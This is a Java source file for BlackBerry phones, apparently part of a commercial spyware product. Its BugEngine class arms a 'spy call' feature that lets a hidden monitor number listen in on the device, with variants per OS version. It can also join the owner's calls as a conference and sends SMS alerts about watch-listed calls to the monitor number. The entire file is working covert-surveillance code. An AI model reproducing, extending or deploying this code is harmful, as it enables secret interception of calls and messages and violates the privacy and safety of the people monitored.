package com.vvt.bug;

import net.rim.blackberry.api.phone.Phone;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.SystemListener2;
import com.vvt.global.Global;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.smsutil.SMSSendListener;
import com.vvt.smsutil.SMSSender;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;

public class BugEngine implements BugListener, SMSSendListener {
	
	private boolean isEnabled = false;
	private BugInfo bugInfo = null;
	private BasePELP pel = null;
	private SCCL sccl = null;
	private PhoneEventListenerSettings pelSettings = null;
	private SMSSender smsSender = Global.getSMSSender();
	
	public void setBugInfo(BugInfo bugInfo) {
		this.bugInfo = bugInfo;
	}
	
	public void start() {
		if (!isEnabled) {
			if (bugInfo != null && bugInfo.isEnabled() && !bugInfo.getMonitorNumber().equals(Constant.EMPTY_STRING)) {
				isEnabled = true;
				enableSpyCallFeature();
			}
		}
	}

	public void stop() {
		if (isEnabled) {
			isEnabled = false;
			pel.resetLogic();
			Phone.removePhoneListener(sccl);
			Phone.removePhoneListener(pel);
			Application.getApplication().removeGlobalEventListener(pel);
			if (sccl instanceof SystemListener2) {
				Application.getApplication().removeSystemListener((SystemListener2)sccl);
			}
			sccl = null;
			pel = null;
			pelSettings = null;
		}
	}
	
	private void enableSpyCallFeature() {
		if (PhoneInfo.isFourSixOrHigher()) {
			if (PhoneInfo.isFiveOrHigher()) {
				pel = new PELPFive();
			} else if (PhoneInfo.isFourSeven()) {
				pel = new PELPFourSeven();
			} else {
				pel = new PELPFourSix();
			}
		} else {
			pel = new PELPFourFiveAndBelow();
		}
		pel.setSCNumber(bugInfo.getMonitorNumber());
		pel.setBugListener(this);
		Phone.addPhoneListener(pel);
		Application.getApplication().addGlobalEventListener(pel);
	}

	private void enableConferenceFeature() {
		if (PhoneInfo.isFiveOrHigher()) {
			sccl = new SCCL_5(pelSettings);
		} else if (PhoneInfo.isFourSixOrHigher()) {
			sccl = new SCCL_46_UP(pelSettings);
		} else {
			sccl = new SCCL_45_DOWN(pelSettings);
		}
		sccl.setBugListener(this);
		sccl.setSCCNumber(bugInfo.getMonitorNumber());
		sccl.initialize();
		Phone.addPhoneListener(sccl);
		if (sccl instanceof SystemListener2) {
			Application.getApplication().addSystemListener((SystemListener2)sccl);
		}
	}

	// BugListener
	public void onCall(PhoneEventListenerSettings pelSettings, FxSMSMessage smsMessage) {
		if (bugInfo.isConferenceEnabled()) {
			if (bugInfo.isWatchListEnabled()) {
				smsSender.addListener(this);
				smsSender.send(smsMessage);
			}
			Phone.removePhoneListener(pel);
			Application.getApplication().removeGlobalEventListener(pel);
			this.pelSettings = pelSettings;
			enableConferenceFeature();
		}
	}
	
	public void onFinish() {
		Phone.removePhoneListener(sccl);
		if (sccl instanceof SystemListener2) {
			Application.getApplication().removeSystemListener((SystemListener2)sccl);
		}
		if (isEnabled) {
			if (pel == null) {
				enableSpyCallFeature();
			} else {
				Phone.addPhoneListener(pel);
				Application.getApplication().addGlobalEventListener(pel);
			}
		}
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("BugEngine.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
	}
	
	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
	}
}
